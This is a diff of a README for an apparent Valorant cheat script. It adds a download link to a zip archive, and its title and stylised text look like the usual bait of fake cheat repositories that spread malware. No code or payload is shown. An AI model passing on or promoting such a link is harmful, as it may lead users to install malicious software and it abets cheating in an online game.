@@ -1,6 +1,6 @@
 # VALORANT-SCRlPT 2024 
 
-[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](
+[📁𝐃𝗼𝐰𝐧𝐥𝐨𝐚𝗱](https://github.com/SamE-L/VALORANT-SCRlPT/releases/download/VALORANT-SCRlPT/VALORANT.SCRlPT.zip)
 
 # ⚙ How to Setup
 
